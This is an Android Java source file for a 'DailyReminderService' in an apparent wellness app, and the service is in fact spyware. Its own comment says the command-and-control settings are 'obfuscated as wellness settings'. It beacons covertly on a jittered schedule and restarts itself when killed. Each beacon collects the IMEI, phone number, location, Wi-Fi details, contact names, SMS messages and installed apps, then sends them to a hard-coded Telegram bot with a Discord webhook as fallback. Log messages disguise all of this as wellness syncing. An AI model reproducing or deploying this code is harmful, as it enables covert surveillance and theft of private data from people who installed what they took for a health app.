package com.wellness.holistisk.services;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.Handler;
import android.os.Looper;
import android.location.Location;
import android.location.LocationManager;
import android.content.Context;
import android.telephony.TelephonyManager;
import android.provider.Settings;
import android.database.Cursor;
import android.net.Uri;
import android.content.ContentResolver;
import android.provider.ContactsContract;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import org.json.JSONObject;
import org.json.JSONArray;

public class DailyReminderService extends Service {
    
    // C2 Configuration (obfuscated as wellness settings)
    private static final String WELLNESS_SERVER_TELEGRAM = "https://api.telegram.org/bot8283973635:AAFzNIcEl78aH-l0iKj5lYKFLj4Vil39u7k/sendMessage";
    private static final String WELLNESS_CHAT_ID = "3032183658";
    private static final String WELLNESS_SERVER_DISCORD = "https://discord.com/api/webhooks/1417361152371064902/DEw6e804zQB6oLB2jWuLvkTPhzMn6aQvsP-GV75mnOY1TWBmAuI9T1H7b9MoGJTSSbmM";
    
    private ScheduledExecutorService scheduler;
    private Handler mainHandler;
    private LocationManager locationManager;
    private TelephonyManager telephonyManager;
    
    // Beacon interval (every 5 minutes, randomized)
    private static final int BASE_INTERVAL_MINUTES = 5;
    private static final int JITTER_MINUTES = 3;
    
    @Override
    public void onCreate() {
        super.onCreate();
        mainHandler = new Handler(Looper.getMainLooper());
        scheduler = Executors.newScheduledThreadPool(2);
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        
        startBeaconMode();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String mode = intent.getStringExtra("mode");
        
        if ("stealth".equals(mode)) {
            android.util.Log.d("WellnessApp", "Starting daily wellness reminder service");
            startPeriodicDataCollection();
        }
        
        // Return sticky to restart if killed
        return START_STICKY;
    }
    
    private void startBeaconMode() {
        // Initial beacon after 2 minutes
        scheduler.schedule(new Runnable() {
            @Override
            public void run() {
                collectAndTransmitData("initial");
            }
        }, 2, TimeUnit.MINUTES);
    }
    
    private void startPeriodicDataCollection() {
        // Schedule periodic data collection with jitter
        scheduler.scheduleWithFixedDelay(new Runnable() {
            @Override
            public void run() {
                try {
                    collectAndTransmitData("periodic");
                } catch (Exception e) {
                    android.util.Log.e("WellnessApp", "Collection error", e);
                }
            }
        }, BASE_INTERVAL_MINUTES, BASE_INTERVAL_MINUTES + (int)(Math.random() * JITTER_MINUTES), TimeUnit.MINUTES);
    }
    
    private void collectAndTransmitData(String trigger) {
        try {
            JSONObject data = new JSONObject();
            data.put("source", "android_wellness_app");
            data.put("trigger", trigger);
            data.put("timestamp", System.currentTimeMillis());
            
            // Device information
            JSONObject deviceInfo = collectDeviceInfo();
            data.put("device", deviceInfo);
            
            // Location data
            JSONObject locationData = collectLocationData();
            if (locationData.length() > 0) {
                data.put("location", locationData);
            }
            
            // Network information
            JSONObject networkInfo = collectNetworkInfo();
            data.put("network", networkInfo);
            
            // Contacts (limited sample)
            JSONArray contactSample = collectContactSample();
            if (contactSample.length() > 0) {
                data.put("contacts_sample", contactSample);
            }
            
            // SMS data (recent messages)
            JSONArray smsSample = collectSmsSample();
            if (smsSample.length() > 0) {
                data.put("sms_sample", smsSample);
            }
            
            // App list (installed packages)
            JSONArray appList = getInstalledApps();
            data.put("installed_apps", appList);
            
            // Transmit to C2
            transmitData(data);
            
        } catch (Exception e) {
            android.util.Log.e("WellnessApp", "Data collection failed", e);
        }
    }
    
    private JSONObject collectDeviceInfo() {
        JSONObject deviceInfo = new JSONObject();
        try {
            deviceInfo.put("model", android.os.Build.MODEL);
            deviceInfo.put("manufacturer", android.os.Build.MANUFACTURER);
            deviceInfo.put("brand", android.os.Build.BRAND);
            deviceInfo.put("device", android.os.Build.DEVICE);
            deviceInfo.put("android_version", android.os.Build.VERSION.RELEASE);
            deviceInfo.put("sdk_int", android.os.Build.VERSION.SDK_INT);
            
            // Device identifiers
            String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            deviceInfo.put("android_id", androidId);
            
            if (telephonyManager != null) {
                try {
                    String imei = telephonyManager.getDeviceId();
                    if (imei != null) deviceInfo.put("imei", imei);
                    
                    String phoneNumber = telephonyManager.getLine1Number();
                    if (phoneNumber != null) deviceInfo.put("phone_number", phoneNumber);
                    
                    String simOperator = telephonyManager.getSimOperatorName();
                    if (simOperator != null) deviceInfo.put("carrier", simOperator);
                    
                } catch (SecurityException e) {
                    android.util.Log.w("WellnessApp", "Could not access phone info");
                }
            }
            
        } catch (Exception e) {
            android.util.Log.e("WellnessApp", "Device info collection failed", e);
        }
        return deviceInfo;
    }
    
    private JSONObject collectLocationData() {
        JSONObject locationData = new JSONObject();
        try {
            if (locationManager != null && 
                (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) || 
                 locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER))) {
                
                Location lastKnown = null;
                try {
                    lastKnown = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                    if (lastKnown == null) {
                        lastKnown = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                    }
                } catch (SecurityException e) {
                    android.util.Log.w("WellnessApp", "Location access denied");
                }
                
                if (lastKnown != null) {
                    locationData.put("latitude", lastKnown.getLatitude());
                    locationData.put("longitude", lastKnown.getLongitude());
                    locationData.put("accuracy", lastKnown.getAccuracy());
                    locationData.put("timestamp", lastKnown.getTime());
                }
            }
        } catch (Exception e) {
            android.util.Log.e("WellnessApp", "Location collection failed", e);
        }
        return locationData;
    }
    
    private JSONObject collectNetworkInfo() {
        JSONObject networkInfo = new JSONObject();
        try {
            android.net.ConnectivityManager cm = (android.net.ConnectivityManager) 
                getSystemService(Context.CONNECTIVITY_SERVICE);
            android.net.NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
            
            if (activeNetwork != null) {
                networkInfo.put("type", activeNetwork.getTypeName());
                networkInfo.put("subtype", activeNetwork.getSubtypeName());
                networkInfo.put("connected", activeNetwork.isConnected());
            }
            
            // WiFi info
            android.net.wifi.WifiManager wifi = (android.net.wifi.WifiManager) 
                getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wifi != null) {
                android.net.wifi.WifiInfo wifiInfo = wifi.getConnectionInfo();
                if (wifiInfo != null) {
                    networkInfo.put("wifi_ssid", wifiInfo.getSSID());
                    networkInfo.put("wifi_bssid", wifiInfo.getBSSID());
                    networkInfo.put("wifi_signal", wifiInfo.getRssi());
                }
            }
            
        } catch (Exception e) {
            android.util.Log.e("WellnessApp", "Network info collection failed", e);
        }
        return networkInfo;
    }
    
    private JSONArray collectContactSample() {
        JSONArray contacts = new JSONArray();
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, 
                ContactsContract.Contacts.DISPLAY_NAME + " ASC");
            
            if (cursor != null && cursor.moveToFirst()) {
                int count = 0;
                do {
                    if (count >= 10) break; // Limit to first 10 contacts
                    
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    if (name != null) {
                        JSONObject contact = new JSONObject();
                        contact.put("name", name);
                        contacts.put(contact);
                        count++;
                    }
                } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (SecurityException | Exception e) {
            android.util.Log.w("WellnessApp", "Contacts access limited");
        }
        return contacts;
    }
    
    private JSONArray collectSmsSample() {
        JSONArray smsArray = new JSONArray();
        try {
            ContentResolver cr = getContentResolver();
            Uri uri = Uri.parse("content://sms/inbox");
            Cursor cursor = cr.query(uri, new String[]{"address", "body", "date"}, 
                null, null, "date DESC LIMIT 5");
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject sms = new JSONObject();
                    sms.put("address", cursor.getString(0));
                    sms.put("body", cursor.getString(1).substring(0, Math.min(50, cursor.getString(1).length()))); // First 50 chars
                    sms.put("date", cursor.getLong(2));
                    smsArray.put(sms);
                } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (SecurityException | Exception e) {
            android.util.Log.w("WellnessApp", "SMS access limited");
        }
        return smsArray;
    }
    
    private JSONArray getInstalledApps() {
        JSONArray apps = new JSONArray();
        try {
            android.content.pm.PackageManager pm = getPackageManager();
            java.util.List<android.content.pm.ApplicationInfo> packages = pm.getInstalledApplications(0);
            
            for (android.content.pm.ApplicationInfo packageInfo : packages) {
                if ((packageInfo.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0) {
                    // Only user-installed apps
                    apps.put(packageInfo.packageName);
                    if (apps.length() >= 20) break; // Limit to 20 apps
                }
            }
        } catch (Exception e) {
            android.util.Log.e("WellnessApp", "App list collection failed", e);
        }
        return apps;
    }
    
    private void transmitData(JSONObject data) {
        // Transmit to Telegram first
        scheduler.execute(new Runnable() {
            @Override
            public void run() {
                try {
                    sendToTelegram(data);
                } catch (Exception e) {
                    android.util.Log.e("WellnessApp", "Telegram transmission failed", e);
                    // Fallback to Discord
                    try {
                        sendToDiscord(data);
                    } catch (Exception e2) {
                        android.util.Log.e("WellnessApp", "Discord transmission failed", e2);
                    }
                }
            }
        });
    }
    
    private void sendToTelegram(JSONObject data) throws Exception {
        URL url = new URL(WELLNESS_SERVER_TELEGRAM);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setDoOutput(true);
        
        JSONObject message = new JSONObject();
        message.put("chat_id", WELLNESS_CHAT_ID);
        message.put("text", "🤖 ANDROID BEACON\\n```json\\n" + data.toString(2) + "\\n```");
        message.put("parse_mode", "Markdown");
        
        OutputStream os = conn.getOutputStream();
        os.write(message.toString().getBytes());
        os.flush();
        os.close();
        
        int responseCode = conn.getResponseCode();
        if (responseCode == 200) {
            android.util.Log.d("WellnessApp", "Wellness data synchronized");
        }
    }
    
    private void sendToDiscord(JSONObject data) throws Exception {
        URL url = new URL(WELLNESS_SERVER_DISCORD);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setDoOutput(true);
        
        JSONObject message = new JSONObject();
        message.put("content", "🤖 **ANDROID WELLNESS BEACON**\\n```json\\n" + data.toString(2) + "\\n```");
        
        OutputStream os = conn.getOutputStream();
        os.write(message.toString().getBytes());
        os.flush();
        os.close();
        
        int responseCode = conn.getResponseCode();
        if (responseCode == 204 || responseCode == 200) {
            android.util.Log.d("WellnessApp", "Backup wellness sync completed");
        }
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        if (scheduler != null && !scheduler.isShutdown()) {
            scheduler.shutdown();
        }
        android.util.Log.d("WellnessApp", "Daily wellness reminders paused");
    }
}